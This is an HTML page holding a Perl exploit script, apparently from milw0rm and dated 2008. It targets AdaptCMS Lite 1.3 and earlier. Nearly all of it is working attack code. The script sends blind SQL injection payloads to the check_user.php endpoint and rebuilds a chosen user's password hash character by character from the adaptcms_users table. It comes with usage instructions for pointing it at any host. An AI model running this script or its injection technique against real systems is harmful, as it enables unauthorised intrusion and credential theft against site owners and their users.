<html><head><title>AdaptCMS Lite <= 1.3 Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
# -----------------------------------------------------
# AdaptCMS Lite &lt;= 1.3 Blind SQL Injection Exploit
# Discovered By StAkeR - StAkeR[at]hotmail[dot]it
# Discovered On 03/10/2008
# -----------------------------------------------------
# Download http://www.insanevisions.com/page/downloads
# -----------------------------------------------------
use strict;
use LWP::UserAgent;

my ($hash,$send,$sub) = (undef,undef,1);
my ($host,$uid) = @ARGV;

usage() unless $host =~ /^http:\/\/(.+?)$/i and $uid =~ /^[0-9]$/;

sub send_request
{
  my $param = shift @_;
  my $http = new LWP::UserAgent;
  my $post = $http-&gt;post($host.'/includes/check_user.php',[ user_name =&gt; $param ]);
  
  if($post-&gt;is_success)
  {
    return 38 unless $post-&gt;content =~ /yes/i;
  }
}

my @chars = (48..57, 97..102); 

for(0..32)
{
  foreach my $set(@chars)
  {
    $send = &quot;' or ascii(substring((select password&quot;.
            &quot; from adaptcms_users where id=$uid),$sub,1))=$set#&quot;;

    if(send_request($send) &gt; 1)
    {
      $hash .= chr($set);
      $sub++;
      last;
    }
  }
}

sub usage
{
  print &quot;[?] AdaptCMS Lite &lt;= 1.3 Blind SQL Injection Exploit\n&quot;;
  print &quot;[?] Usage: perl $0 http://[host] [user id]\n&quot;;
  exit;
}

if(defined $hash)
{
  print &quot;[?] Hash: $hash\n&quot;;
  exit;
}
else
{
  print &quot;[?] Exploit Failed!\n&quot;;
  exit;
}

# milw0rm.com [2008-10-03]</pre></html>